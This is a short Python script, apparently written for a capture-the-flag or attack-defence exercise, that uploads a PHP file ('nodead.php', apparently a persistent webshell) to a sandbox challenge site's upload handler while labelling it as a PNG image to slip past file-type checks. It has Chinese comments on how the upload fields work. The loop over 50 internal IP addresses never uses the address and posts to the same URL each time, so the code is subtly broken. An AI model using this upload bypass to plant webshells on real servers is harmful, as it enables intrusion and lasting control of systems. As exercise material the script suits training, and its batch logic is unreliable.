import requests

targets = [f"10.0.0.{i}" for i in range(1, 51)]
for ip in targets:
    url = "http://challenge-ac6e09b2fbcad8e5.sandbox.ctfhub.com:10800/"
    #login_url = '/login.php'
    upload_url = '/upload.php'
    #url1 = url + login_url                       #不需要登录就不登录
    #user_passwd = {'username': 'admin', 'password': 'mysql'}
    session = requests.Session()
    # r=session.post(login_url,data=user_passwd)
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0'}
    file = {
        'file': ('333.php', open('nodead.php', 'rb'), 'image/png'),#图片文件格式:file={'字段名': ('文件名', 文件内容/对象, 'MIME类型')，submit},字段名需要抓包获取
        'submit': (None, 'Submit'),
    }
    url2 = url
    r2 = session.post(url=url2, files=file, headers=header)
    r2.encoding = r2.apparent_encoding
    print(r2)
    if r2.status_code != 200:
        print(url2 + "  上传失败")
    else:
        for text in r2.text.split('\n'):
            print(text)
            if '上传成功' in text:
                print(url2 + "  上传成功")
                break
